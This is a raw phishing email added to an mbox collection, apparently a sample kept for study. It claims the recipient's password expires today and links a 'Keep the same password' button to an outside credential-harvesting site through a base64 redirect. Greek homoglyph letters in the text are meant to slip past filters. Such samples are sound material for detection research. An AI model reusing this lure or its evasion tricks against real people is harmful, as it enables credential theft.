@@ -1,0 +1,433 @@
+From jose@monkey.org Thu Nov  7 07:36:19 2024 +0000
+Return-Path: bounces+47945524-25bd-jose=monkey.org@sendgrid.net
+Delivered-To: jose@monkey.org
+X-FDA: 82758489744.39.BAE7196
+Received: from wfbtdvkb.outbound-mail.sendgrid.net (wfbtdvkb.outbound-mail.sendgrid.net [159.183.216.27])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 0D932A0005
+	for <jose@monkey.org>; Thu,  7 Nov 2024 07:36:06 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;
+	dkim=pass header.d=sendgrid.net header.s=smtpapi header.b=awx5MKpb;
+	spf=pass (imf07.b.hostedemail.com: domain of "bounces+47945524-25bd-jose=monkey.org@sendgrid.net" designates 159.183.216.27 as permitted sender) smtp.mailfrom="bounces+47945524-25bd-jose=monkey.org@sendgrid.net";
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1730964800;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:list-unsubscribe:dkim-signature;
+	bh=9UjcjruTm0kPQNq8zFCwJcEC5GM47Y5OEjM7Jot4aO0=;
+	b=Bsu5GarZOvhyWrFCQBRGgquPNi/OjJkFs+S/McEBib+U9+xDi9igQz6DUZ3o/OWCqN6ECA
+	46HoXfPeNPZPyE4JDbszMrRi0WMxtE+R2Xsk5ApXfIXXGpCT3MSfo1V1I5vbRrvHRKrnqh
+	c3mI0Zw/1i9Q9fA8CExuski2n5BFbis=
+ARC-Authentication-Results: i=1;
+	imf07.b.hostedemail.com;
+	dkim=pass header.d=sendgrid.net header.s=smtpapi header.b=awx5MKpb;
+	spf=pass (imf07.b.hostedemail.com: domain of "bounces+47945524-25bd-jose=monkey.org@sendgrid.net" designates 159.183.216.27 as permitted sender) smtp.mailfrom="bounces+47945524-25bd-jose=monkey.org@sendgrid.net";
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1730964800; a=rsa-sha256;
+	cv=none;
+	b=wiWpkXC0WybwEphmyqpQCQAY+6oVrUQCyRyrZtUJtEXtXLgmC8TS0kag/8ad2aXcnacG9j
+	jkBMWspLiWYhH/WeE/gFUm1cDabTGLfhuI/iVOPFuieXAWcDV12eKYULCk+bj+HWpy+Au1
+	jz8OKgoIpQyE06tXy6ci2xkRVqf+eZc=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net;
+	h=content-type:from:mime-version:subject:reply-to:to:list-unsubscribe:
+	list-unsubscribe-post:cc:content-type:from:subject:to;
+	s=smtpapi; bh=9UjcjruTm0kPQNq8zFCwJcEC5GM47Y5OEjM7Jot4aO0=;
+	b=awx5MKpbv068TTLVSeOkQwY3I8RhNjpizH6oidtcPGFs13lH+SGcblKUrhI0eWfRkSHs
+	IW+S5qnt/lhGPYPfP8L/X1T/2ageR2Kv7O6zouM02Ur8blA+S8JioaCg6OVU9vkO7s046c
+	BURg0HA63S+QFG7TV5rxzkoMZSMkMKMe8=
+Received: by recvd-canary-654c5c7c6c-xdqpf with SMTP id recvd-canary-654c5c7c6c-xdqpf-1-672C6DEF-4
+	2024-11-07 07:36:15.2185353 +0000 UTC m=+4376788.052552272
+Received: from NDc5NDU1MjQ (unknown)
+	by geopod-ismtpd-6 (SG) with HTTP
+	id tz8-Y0oVSAKkaOXbTZLhKA
+	Thu, 07 Nov 2024 07:36:15.211 +0000 (UTC)
+Content-Type: multipart/alternative; boundary=2152463e7d8d898728f953816db13d8d08eb7dd5d55e9c71a06fba0a390c
+Date: Thu, 07 Nov 2024 07:36:16 +0000 (UTC)
+From: email <lahan@ddkc.com.np>
+Mime-Version: 1.0
+Message-ID: <tz8-Y0oVSAKkaOXbTZLhKA@geopod-ismtpd-6>
+Subject: Action Required
+Reply-To: lahan@ddkc.com.np
+X-SG-EID: 
+ =?us-ascii?Q?u001=2EjoieYMAkljAp2cNIJAFBzGZ6Fv0vcWDXbiPprrX31xYDE0WmXA+KM3zkk?=
+ =?us-ascii?Q?P9MUp5qt5fzOAb9R3Lll7=2FFjL9NlWqeH1lN9uxj?=
+ =?us-ascii?Q?vcIAdL=2FfH+R=2FJQtY=2FQbY0K9Qz7Va3jedk9+J+q6?=
+ =?us-ascii?Q?b=2FqOydjYPeF6csikTH3ZqXdi5KCo44jAePqVwYh?=
+ =?us-ascii?Q?z3ng8dPUhaHBBKYocFlfcO3ugrCBlGD5xg7IcCW?=
+ =?us-ascii?Q?gty8CtVd5tdNSqQH55m8+s=3D?=
+X-SG-ID: 
+ =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
+ =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
+ =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FnwaK92I?=
+ =?us-ascii?Q?akjjBRaNaQGWlqqVtoi2B4isjuv1HDAiUuCmKsI?=
+ =?us-ascii?Q?F8X1n=2Fe6ep7iFG9iAskFzLMGW7TXgi+qj+Y0Gdb?=
+ =?us-ascii?Q?PsP+r0AkwN10=2F35I9a4jMB=2F7we8JbFRcm0thY7v?=
+ =?us-ascii?Q?CuffLb18UIqiMSIizUuwSCSxilBCeueHB00XRTg?=
+ =?us-ascii?Q?YtfGyZtBfgkXOsqxaYQiYxWMDfEMbSvhGPvFPAo?=
+ =?us-ascii?Q?o1Wi0wy+4OhTTVBObRv8PJp=2F0l0KnaflPw7buPY?=
+ =?us-ascii?Q?YRCiyUKBpYtLuSZFLV6BU9p0ToHWMPKe+giBPRZ?=
+ =?us-ascii?Q?s6grS6N5r4drBWJrGXjRfYGN7olfC2lAooTBP3l?=
+ =?us-ascii?Q?FwXa5qLOLlRL1vT4AfoGfxqadnG8673thtj=2FWl=2F?=
+ =?us-ascii?Q?dGSA7fh1w05eoSV0oRrhpOFPPIH9ojAFJUdM3r0?=
+ =?us-ascii?Q?k3dQ4jlm7dPhHlr+c5DmTFXWei8PlKWIPmHZqEU?=
+ =?us-ascii?Q?hKVOnspDsnCD344Z25y+ptPwwkNY79Vgy5kPiUI?=
+ =?us-ascii?Q?HgjkHTWGgiaqjfAGY+vTFejtG4l1zy0zSnyUhsu?=
+ =?us-ascii?Q?QYKNcrtxQPIJcoVCNsxhhdtdLuaORmW9aCBRhDw?=
+ =?us-ascii?Q?2wocQ6+v98+7YArYtpWgYf28BEnzIz+vpSyIN9I?=
+ =?us-ascii?Q?D1Ah+ELEpAA0ZXhTfsrD9tZgeQ=2Fi+COMWSTavk5?=
+ =?us-ascii?Q?3XZzZfC2M?=
+To: jose@monkey.org
+X-Entity-ID: u001.UiYEABFLkwrZq8KDY2HL5w==
+List-Unsubscribe: 
+ =?us-ascii?Q?=3Cmailto=3Aunsubscribe=40sendgrid=2Enet=3Fsubject=3D47945524=2E3nkHN3d-Wp1z?=
+ =?us-ascii?Q?wVcfYmUahVLNUYCt2P7Q-gs4m=5FQgeENoMDAwdTA?=
+ =?us-ascii?Q?wMD8P6IQc1pLFqkG0xC52-K7HFiibViQeMOjDm6?=
+ =?us-ascii?Q?7ijHKD16RDFwa0DfvgmX6x-hXiiOO02VpiobZpF?=
+ =?us-ascii?Q?5blasRWEF224F19Rbw-6qdGHVJGoMsC=2EdUGN-yw?=
+ =?us-ascii?Q?zQGWjsoAU15ScVHHqcw6wBxwIbDOPXDn8H=5FRoMD?=
+ =?us-ascii?Q?AwdTAwMLGL9mav=5FsSwzDWK2=5F7Yf3thodQXNMCEo?=
+ =?us-ascii?Q?qE3Tib9=5FiSc8NaLHkT3w9ejwONf9EXz8CkDQXZc?=
+ =?us-ascii?Q?GcsbIGSytMoTT99wZNBSGhP5zt=5FcJSpF5bJy=5Fgl?=
+ =?us-ascii?Q?T-tZB7IeBIyB9AuhcZ3v4JJbDfkgQmGN7ZEOSZL?=
+ =?us-ascii?Q?nIh92SEP-g44r0O-=5FCLj4BGdOhYlLJOfmWcgXNJ?=
+ =?us-ascii?Q?DiAkp6ZbPb-eBx=5Fu9IfTzujj95tg281gFCc=5FBqS?=
+ =?us-ascii?Q?nYBW0oEkIqjlOc9q-f0KStvrYjtV3PcnMtxA225?=
+ =?us-ascii?Q?ptURgLZosIp5gTz33W1n7=5FDrsY6kDUlvQ-SmPTP?=
+ =?us-ascii?Q?kHuTFT70JLEkkiYjC22iwzu3b0dsqaSZYTDb5z1?=
+ =?us-ascii?Q?3l9cY973YCWv6LlVdAcI0506nPkyOAubK2wBdzM?=
+ =?us-ascii?Q?PXUTmLxOindzZVuK7=5FP0Z4CsBjHpoyvxnZGqwJG?=
+ =?us-ascii?Q?DyjH2js4hWO72onrv-lmFv3I9r1kaTmXMszGNub?=
+ =?us-ascii?Q?6PK-vHmgsHlSbrghaGYM7LeYqMtqspFaD57yC53?=
+ =?us-ascii?Q?XFmBVGqGBLXDGwjMyr0rTmKte4N-=5FfE8GiSh-CN?=
+ =?us-ascii?Q?6tMtCxtH6vL4JHSucWqlvUfIc2TJ71s6Oo4W2JI?=
+ =?us-ascii?Q?I3UCzShKEsC1LUAWYrTy2rSjkbC18mKLRrwRib3?=
+ =?us-ascii?Q?DPQaBWBhPkW46H1eXsnonhFJdOiC9EzpYITJ3rd?=
+ =?us-ascii?Q?sDInJ7oyfzYDZ58YE=5FTkt5y-zMDzQgoxsyDSJcn?=
+ =?us-ascii?Q?oYEY7Fv7VniYDH41y8QllIovlmONi0XDlegCiFZ?=
+ =?us-ascii?Q?YtGv8kFbFn26Wx1iVCgpBYy=5F=5FO1pO0KiYPEeZ7G?=
+ =?us-ascii?Q?ehrCesqDHM9LEYLnAxAlC-HsaSPCGh7XFhvdZGZ?=
+ =?us-ascii?Q?wgbr4swdQyX0Y6q0fUTOER0NmpQt5QfxXEtJhk0?=
+ =?us-ascii?Q?ph-rDThcY3uPIHJb4a1LGM=5FsRW-q57V3ZDdWzS9?=
+ =?us-ascii?Q?3lAI05RALFDB3vOPwo2jipmUluD2gNd9NDJmU5Z?=
+ =?us-ascii?Q?L-cBzZO0KwUfAigtzF6-ksF5ovlq4OFYTozAFiu?=
+ =?us-ascii?Q?XmU0PiEEumzR1w=3D=3E=2C=3Chttps=3A=2F=2Fu47945524=2Ect=2E?=
+ =?us-ascii?Q?sendgrid=2Enet=2Flu=2Funsubscribe=3Foc=3Du001=2EhJP?=
+ =?us-ascii?Q?CjCA2QTliVEbOcCkQIIHN5mMkEGKPMh6dQnETdZ?=
+ =?us-ascii?Q?Y29zxG1naf7Idk5Jz6H5apksBL5hGhIeo98gtZY?=
+ =?us-ascii?Q?x3F6-hPJZGT=5FvM0v3esVlFAwqT0nrsGAZfZlk8F?=
+ =?us-ascii?Q?XV=5FeBiVKelSkz4NhoiNibtJyv9mUxjn7DADQw6F?=
+ =?us-ascii?Q?mRyR6slm3S4uee8Cjb=5FnSs=5FMK2OnaN2PKcOvU2Z?=
+ =?us-ascii?Q?QxW55cBLeo03pr2YRikCUEJa7Z5WkSreyOn3o-d?=
+ =?us-ascii?Q?Btf6zeg7o6eOIu5JDUtcvWmVqKDl8ZvhMHNCK4W?=
+ =?us-ascii?Q?8EXey7hkD6NVD-J7ZcfP7V=5FOU=5FxLDym-gH7nr5i?=
+ =?us-ascii?Q?e6B3brZ76luxO6nieT6S1I35eQcCYUN75w46uBs?=
+ =?us-ascii?Q?l3XhNIlbmbxUCtViNYlnWE7y2=5FvKU=5FXJq600Gmu?=
+ =?us-ascii?Q?8zvflvbJGM1g=5FMjcy6S6TGpUnBcLgFpw6bptZAM?=
+ =?us-ascii?Q?TFhO--0xDd=5FurGYS-O1doWPbjnwwBePNp8hJQTB?=
+ =?us-ascii?Q?zjKR3slV7kXr70CR4ejujW8CBIUhRVsi3iIyG5V?=
+ =?us-ascii?Q?HzDtImQXUJ7y6fOh9y-MD4MyENYsD8ekArN3Jlz?=
+ =?us-ascii?Q?y34Ft29WU4INMxSvpBhRUplu=5F3i8m4gKLelR2MB?=
+ =?us-ascii?Q?U8cqILj=5FRG25FO7deaJKjL0nwl5xrNqwutq54ix?=
+ =?us-ascii?Q?-73lD7u8UNbiiqH73hUK=5FIPcwn0Xp7fWrTqAGA7?=
+ =?us-ascii?Q?r5X8j6D1n0JOs1j-sHn-jyJaFb3tzyFDl8GpI7k?=
+ =?us-ascii?Q?u6PVPG0KCUnUCkmyyXXgXfILRoLDXu38D3ecTT9?=
+ =?us-ascii?Q?M4cFKmj1j=5FfEZb-b1g5dnx8lvscJN6OEUKR9XWJ?=
+ =?us-ascii?Q?5HFWkS0Vgv0-bIfiZ1I-hk7koryp11R3sbqYm3t?=
+ =?us-ascii?Q?IQfR8r0tXV5UAY=5FXuzG-qV0prinsrc6ZOXzTZAg?=
+ =?us-ascii?Q?KCMz=5FUFINJPvkWHrVhPcH=5Fykh=5F4Yal-g4tgvwRq?=
+ =?us-ascii?Q?F1FyxfxxZ=5FCcSF5gHtTzhoMrWFuuNcEYKJ5-TxA?=
+ =?us-ascii?Q?WZhtLaRb4wlB3m2-YwEriKTbZYfe6HZ3iHX9zZu?=
+ =?us-ascii?Q?sXrVWJFSZJnBDc0yba=5FUbAhluyKGsCOiEHU-oIP?=
+ =?us-ascii?Q?TAiwZPmwpg6Phoq3paEM-QTVJdxppcAL--LTJrZ?=
+ =?us-ascii?Q?efTJZ5f-Q7boBOoz2vjuD1nnGda56CFqnQIigHb?=
+ =?us-ascii?Q?1S12c9A2N3aNpCBOUYPi2uPfg0=5F0dds5CYjtI3c?=
+ =?us-ascii?Q?VAK26Zul5nFqdFv62zh4HWD=5Fl4RlfvQCfzP9lDz?=
+ =?us-ascii?Q?0QFWnThy5d5uD-76U4i29J5AMEet8cpUndgT6D4?=
+ =?us-ascii?Q?4J60R-oE4ypj7zLpFO2ka7vtIUFovby7rFXFmNy?=
+ =?us-ascii?Q?1qRJXoA6-9fI6zIRSqFoRAZhtZydjWVlEXZKeUm?=
+ =?us-ascii?Q?ITP2XtPnspPap6rN3e-TfVLWq7GRCUw-=5FNcujs9?=
+ =?us-ascii?Q?cCuvPSBMtwBqe0HYDyIJ8DdLg6pEXB0622NNL7x?=
+ =?us-ascii?Q?x7MukEKdBue75Z4Ql=5FzTXS375TRyDHVKh7bZm5Z?=
+ =?us-ascii?Q?YD1ECAbA6i=5FTBWEbtfmgPdEAybud1zJr3rW8Jjx?=
+ =?us-ascii?Q?cxnIDYdMx0KHj317y8mV8v8sJFc=5FYHEfX1hf1Dj?=
+ =?us-ascii?Q?H0sCqrQfS7LBNtGFhvlGlniS=5FnZpIpaMIsuHWTJ?=
+ =?us-ascii?Q?UfRF9GLRX02ovAUVBoXNUXQ9yqXtRcYPqlVfrY6?=
+ =?us-ascii?Q?Y28Nqbbv7ljobS7rpVoyTqlELJfGRiO23nmFMzj?=
+ =?us-ascii?Q?W9UzC6oaYFVCuDfH1VxqThkelxWphkXKRKUPOXi?=
+ =?us-ascii?Q?bvKeWrjCh2NOO9-yXZfK9zCee03smaBzupJgNAB?=
+ =?us-ascii?Q?382jXg=3E?=
+List-Unsubscribe-Post: List-Unsubscribe=One-Click
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: 0D932A0005
+X-Stat-Signature: mn61cejd9tizpiqm7zz1rcjj6cuw37m1
+X-Spam-Status: No, score=2.09
+X-Rspam-User: 
+X-HE-Tag: 1730964966-369992
+X-HE-Meta: U2FsdGVkX19McXSuUIlAqgdm0E7qpBCxSeRi/IyN4VZPIcI6Fno7xGgt3l4CzxyXkTfAT9a49ol6LxROvuqjfpljGZwcCHCsnMeNKowL06QtA8Xa0FG1cyB8n9Gg0Vy6+ujzKb/yH1Z96TegzADlO3VWqk71Azd/dR7lJSxZRIYeKbKgby7v2n1ziJhBoNvBEshvXPrM41TCCv+6g6HG8zyaV2wWW/Jt/zEtI/fNcllgUD7M166eizEdgyywXwX6wrfLB976FVE+neyMxyUuzdZAzsZgN4uZ9K5ra/9v1xx3AKowl6pYe6tZdOsV6s9jS3C1D8SOA7AXvBW6ek+VTqqkS+9MTk+yp89ek2CVZzjmfRR1eA3+t/qncpQMpdqNcjEOZCYdVqjnYDAePyR93xNEopMfiavG+YcoOxQs6j2VwHH+l91tmU92mLp591bpLiXSAtt1vRCZpuYiUi6eT8jQ/KrWcrAOg9pIJv+gBKERo2VUiQVY3qor5KBGczLLcdxlVzRpWa14T5q97qwlZwmwoIZcARheTr0JDYU0BktSol+ECUzlfBomDtw/mVleC6UJisBW5jTRyoc79sYqPog9Mf3TlfSTPnw1uLtzdzRrwU1+r9Jz7tw6oa9ANbmMaT2MYOGOuXNg0KgvcrAS6aOldDa21Ts99pyiSirf/B8ojsdYXyaJVI2jPBhMMEmgBuo2RD5ue4FBbnptvmPqu/d2Uiai2P2uXUjhhd64w4xQNazylfWZY+x/mzp+rVpzraXsZyW7zOGXzl8oE3USCoNShVcq/UHym8GoEtL1s2yUp1iEZSji3Alg7mU+cL1xRzy2CUcKmFnajv9nBfzfhV4b6u7v2hPoAA+cgoPHtpgBBx86HN0F0AaLtjRY65UV2bl0yLhMuSZ9nSFHre86NSOERHTLGgEsAQzI03VUnhGQr/Amx1ZSzVhcQFURcEo1DBFkM3UIHrSuOCH4Z3wHdHR4TwC
+ A23mLnnrvR6sxsITVFlQfhqtrQyXGJkGY/zrZbPGWbXRG+H2fQQ4HjzTYJNqPptes9Fg5HkSamEPPLhP5q80lrGFkr29qZYX50Ggla0Y/fHIc8cIlt7+bvZ272o7KW5RP+XmsYbOgydZRHSe21B1T9EGs1ZFpRBQ4AgQjbw6gX7MkeC++OgVgc+rcf1DRUjz2Zhn5Rz5KN3H74u/S/3yc4BMiVtEKzgDLuTKKwZNGoHL8tc54iJZ1UMk47nIpVUDlS6/4rDg6Xsl0tcdPjvWWj3/RNBiak16gAAt2byMQkXx6LZSY89Ns0dIfdh+mB+HSBTaVd6Wpw/JGxM359woWMf1faCsJKMF3dBI5BfBJuae5R738FOP3LoIhjoCAtN39/RSogNoO+uNRaIJI02YYG28ON9J/dto5adzaDFWAWlJjGElyFfJeuI1YtYLB1ji+mjeHFaL1RwerzV9TmDn/Ot59Kda3DGnCsRRL8f5a8g2uEpsSGdRw2QCcKf3G6R0SA6gmmuu76x7y6zZXOUvSy5BFC0lqF6vlt5p1lrR7NZdp0PEveyCZrsn+wM6F6x0HnJk6ZzhqaCc04VmZbb4njo5ZYJVQZF47bsVGNUiYUxjdwXhII+ZkDY1T1K/mkAhuobqz
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 332
+
+--2152463e7d8d898728f953816db13d8d08eb7dd5d55e9c71a06fba0a390c
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=utf-8
+Mime-Version: 1.0
+
+Your jose@monkey.org =CF=81assword expires today. 07/11/2024 16:18:28 (A=C3=
+=A7ti=CE=BFn Required) =CE=B3ou must ta=CE=BAe immediate steps to maintain =
+and pre=CE=BDent restricted access to =CE=B3our accou=CE=B7t jose@monkey.or=
+g
+
+=CE=9Aeep the same password ( https://ledistronica.info/file/?to=3DaHR0cHM6=
+Ly9sZWRpc3Ryb25pY2EuaW5mby9yYzIv#jose@monkey.org )
+
+Issues found in the application completion system will no longer be in=CE=
+=BDestigated or corrected.
+
+Unsubscribe ( https://u47945524.ct.sendgrid.net/asm/unsubscribe/?user_id=3D=
+47945524&data=3DtZX5iNiCjyGBXMmBi0Nakska152qHbZsJCofn8m0uFNoMDAwdTAwMAy85Cf=
+jLINPKBiqveC-jQpIQhHJxmGDbQ7BUT-RWh1xq8_Ff_DMOfQ6xoTYmdRX6isAzK6cig_-7IGAEl=
+zGwUg971CfDBPDD5Ut59v9GTIpOXsiG5uZn9LkmcrgPXYalpPbiuruSGdSe7cVRplo0oftpqnJz=
+72uufnFIy6JVJ46UMuIzQlqZLtmGN0d_iptifNu-EqzK16roc5-2wbGPLRoQdJsYy9TdsAv7JwP=
+A7CCna5TMjbqUDoQuUWoCbUSivqs9MoZ0D0vfR1pWnn0mzJW4GdPNcTpSKwjDSzGtsMBonY0blO=
+0zuC8q-mA-t9-xXEeLC3fVAzjOWVD-blLFUNUF4ndCr_EKAN-NPv05tHCSsMYn5J0uQWQaUcKIK=
+8z-3eRMNN4TMfGFMnfOxJK8tkG1dPBiZSU_kHH92nTZS1V6z_S3IMcngLghk6fv-UJZyQp5i40n=
+r0trVhrMnLHmXMLuBSBlK6DLH1TP1Kw5yDc2XRrsVQKkLDlXU6WQpVtMIDKeZL_0nju49k75ir0=
+eexzxPLkXWGfQys_EY7xOv3pF5-2_INwyDpDvXoXDSdWlH8Gttjv1L7_CbkuVPeu6_xCC0SJRRV=
+Vcc1QbxkVBaU8sk-UOgId5SsTnufjlybUomvzF9pJYMoW4hrqZGguopwvz_ktrSFCsnczuayvUd=
+htM9z84zPtloyNnR3FOM9UN20-3CstCfTNmU12fpybn4xJKdwLZAWUihLv8lVhWIkBOwTcs9hPM=
+Ay10dVR2zeyefRU5XaNjKeCpYFANyO8vMR9NTQ_XFmBAoKdiUo7ddZetMlsEnT5kfiN6DAnz6UJ=
+_EAzpSW0NPY24UhiN1teYwQjoVBc0V8JvWHeeJdNe-oF8o_i6HEyar_gfjuHAzb7Ha-QtmPE0hK=
+vkZcnRgAUQnqVkeHb634yMI-RLJIaSGGyw-7LR5cgVFOSK___BlAiAt10nditRBpSr-8dFQUd_b=
+fTQKmFtVLSY-D9O2JyFJTZ0s9qcFfLbYX3FXoqnA1SUcjWAVqusYo9MkyFG1VhqeaiTzkN1wGTJ=
+9117wRwrqyYZLdzC61k9qHA39GBiKAMPHjfLBDVH7adfU4AEy0MJZxKigPkDBC-4L8rJyylk3Lf=
+ ) - Unsubscribe Preferences ( https://u47945524.ct.sendgrid.net/asm/?user_=
+id=3D47945524&data=3DO-xCvlQuKaBjoZTutdUCDF3sDpHN4ZEPp69Fd81LHXFoMDAwdTAwMM=
+mJVpzyT0P1iLUgcLkyOmVcYybph4lmGRTW3TUuq8TNyDmO1YovODBtO41a57ZMG0FTZdCKDdiXi=
+3gDmgX8tEMfhzgdfPkRo_FiWApvX4MYnpOs5pAaaW3rCqyXiSufOveiCZRgjCBRyMuNa9d87Oel=
+2okIzxuBfeTf8XrBY2A1Sm9Hrg-qF-8po3B7PzB1_s2JB5MOnwrJVS2Vn8dis85OxdxVxGNUQWX=
+TwL_sZ7kCD95_-QMgyONWaXhgRz8xb_FPBDlycjM8hduTbLeCpdFbdwyGhuBma1GkMriDkU2lgC=
+8OfJrTL3oiboetGh3jBaWL58wHkGmg2ejgHequ6wAs4MIvcdaaR83qEOIw4kQxDmCmcp_v-m0vo=
+1metLjARXX1jjbJOusRTjIdhBNxpQcLhJNT-ypIRVYWkec2wwyQSJbc9o79s7PwYUGlZ14hm_Go=
+y3p0PjJUu30sr2u86wld-N8qwyxbI8U8ddrYFqwOl3avnZBdnfxIvmId6IdrFxMePB_W99Dbg3z=
+jES-vdyqR9_MBG8O-9YVQZWTVIs7t3TjzB3kjFQUeWx2fCikVVoCZYCJCEv8hFocoPSnIMjK4Mt=
+5LFA-QmO0N7JLzbIK17v54Uz6SJYHZRj_VZ6DBjMTkIDA_K2pTuFTVU0vf9enkV7jAalBSV8U_-=
+feEymfGH0gJyUQGjSpa5RP46oOFvSU9rqtzWJ3JgF0m4Be6NfxNvcktrBCqiSdanZqTL_mqoWVN=
+MGynC6IodxSTsCbxBGY9nErW9KZRqD6dirO0gJqxOaP5XRWmn2YdmrN9GeLJie_LCca0uZ1It4O=
+-H2U36La2xh32jIaQaw5cuJ4z4sL09oYTxd70QXlqGGf5DP7aEH6E5TPLKj_9ulN0ghG0mM6T3P=
+0VClnJpy93Yp5hRC73dvlh8zgV9KPbN9eSncjAsIL2-WQVSHY5MYn76FwxQivOh41XRpPbNepTt=
+_MzkC-kg0ZUYJF6P2_5pBSgOJqauaxo4kgfSv5TOieH_ea3X3xN1ZUg4dhujycWyDJUYigiYgyU=
+ls0BRQkmEHGesd9iuUV3alOpBz9IZVJhC0GNA4_QhJmx2GnwMI-Vjl78Rcdni6RbzgREwSWeuOr=
+fku4K )
+--2152463e7d8d898728f953816db13d8d08eb7dd5d55e9c71a06fba0a390c
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=us-ascii
+Mime-Version: 1.0
+
+<!DOCTYPE html>
+<html lang=3D"en">
+
+<head>
+    <meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <style>
+        /* General styles for desktop and mobile */
+        body {
+            font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, san=
+s-serif;
+            font-size: 16px;
+            color: #212121;
+            background-color: #FFFFFF;
+            margin: 0;
+            padding: 0;
+        }
+
+        table {
+            width: 100%;
+            max-width: 650px;
+            margin: 0 auto;
+            border-collapse: collapse;
+            background-color: #FFFFFF;
+        }
+
+        td {
+            padding: 10px;
+            text-align: center;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .btn {
+            padding: 10px;
+            text-align: center;
+            background-color: #0072C6;
+            color: #FFFFFF;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px 5px;
+            border: 2px solid #0072C6;
+        }
+
+        p {
+            font-size: 15px;
+            color: #16233a;
+            margin: 20px 0;
+        }
+
+        .unsubscribe {
+            font-size: 12px;
+            line-height: 20px;
+        }
+
+        .unsubscribe a {
+            text-decoration: none;
+            color: #16233a;
+        }
+
+        /* Media query for mobile devices */
+        @media (max-width: 600px) {
+            table {
+                width: 100%;
+            }
+
+            td {
+                padding: 5px;
+            }
+
+            .btn {
+                width: 100%;
+                box-sizing: border-box;
+                margin: 10px 0;
+            }
+
+            p {
+                font-size: 14px;
+            }
+        }
+    </style>
+    <title>Email Notification</title>
+</head>
+
+<body>
+    <table>
+        <tr>
+            <td>
+                <svg xmlns=3D"http://www.w3.org/2000/svg" xmlns:xlink=3D"ht=
+tp://www.w3.org/1999/xlink" id=3D"body_1" width=3D"80" height=3D"80"><g tra=
+nsform=3D"matrix(2.5 0 0 2.5 0 0)"><path d=3D"M26.531 11.469C 26.531 13.068=
+ 26.135 14.532 25.599 15.865L25.599 15.865L26.531 15.334L31.067 12.667L27.4=
+67999 10.667C 27.067 4.667 22.134998 0 15.998999 0C 9.862999 0 4.930999 4.6=
+67 4.529999 10.667L4.529999 10.667L0.9309988 12.802L5.065999 15.198L6.26399=
+9 15.865C 5.596999 14.532 5.331999 13.068 5.331999 11.469C 5.331999 5.599 1=
+0.133999 0.9329996 15.862999 0.9329996C 21.862999 0.9329996 26.529999 5.599=
+9994 26.529999 11.469L26.529999 11.469L26.531 11.469zM0.135 23.068L15.599 3=
+2L15.599 22.135L0.13500023 13.1970005zM16.401 22.135L16.401 32L31.864998 23=
+.068L31.864998 13.198001z" stroke=3D"none" fill=3D"#00467a" fill-rule=3D"no=
+nzero" /></g></svg
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <p>Your jose@monkey.org &rho;assword expires today. 07/11/2=
+024 16:18:28 (A&ccedil;ti&omicron;n Required) &gamma;ou must ta&kappa;e imm=
+ediate steps to maintain and pre&nu;ent restricted access to &gamma;our acc=
+ou&eta;t jose@monkey.org</p>
+            </td>
+        </tr>
+		<td>
+        <span style=3D"border-top: #0072C6 2px solid; border-right: #0072C6=
+ 2px solid; border-bottom: #0072C6 2px solid; border-left: #0072C6 2px soli=
+d; padding: 10px; width: 180px; text-align: center; background-color: #0072=
+C6;">
+            <a clicktracking=3D"off" style=3D"font-size: 14px; font-family:=
+ 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #ffffff; text-deco=
+ration: none; font-weight: bold;" href=3D"https://ledistronica.info/file/?t=
+o=3DaHR0cHM6Ly9sZWRpc3Ryb25pY2EuaW5mby9yYzIv#jose@monkey.org" rel=3D"noopen=
+er noreferrer" target=3D"_blank">
+                &Kappa;eep the same password
+            </a>
+        </span>
+		</td>
+        <table cellspacing=3D"0" cellpadding=3D"0" width=3D"auto" border=3D=
+"0">
+                        <tbody>
+                             <tr>
+            <td>
+                <p>Issues found in the application completion system will n=
+o longer be in&nu;estigated or corrected.</p>
+            </td>
+        </tr>
+        <tr>
+            <td class=3D"unsubscribe">
+                <p>
+                    <a href=3D"https://u47945524.ct.sendgrid.net/asm/unsubs=
+cribe/?user_id=3D47945524&amp;data=3DtZX5iNiCjyGBXMmBi0Nakska152qHbZsJCofn8=
+m0uFNoMDAwdTAwMAy85CfjLINPKBiqveC-jQpIQhHJxmGDbQ7BUT-RWh1xq8_Ff_DMOfQ6xoTYm=
+dRX6isAzK6cig_-7IGAElzGwUg971CfDBPDD5Ut59v9GTIpOXsiG5uZn9LkmcrgPXYalpPbiuru=
+SGdSe7cVRplo0oftpqnJz72uufnFIy6JVJ46UMuIzQlqZLtmGN0d_iptifNu-EqzK16roc5-2wb=
+GPLRoQdJsYy9TdsAv7JwPA7CCna5TMjbqUDoQuUWoCbUSivqs9MoZ0D0vfR1pWnn0mzJW4GdPNc=
+TpSKwjDSzGtsMBonY0blO0zuC8q-mA-t9-xXEeLC3fVAzjOWVD-blLFUNUF4ndCr_EKAN-NPv05=
+tHCSsMYn5J0uQWQaUcKIK8z-3eRMNN4TMfGFMnfOxJK8tkG1dPBiZSU_kHH92nTZS1V6z_S3IMc=
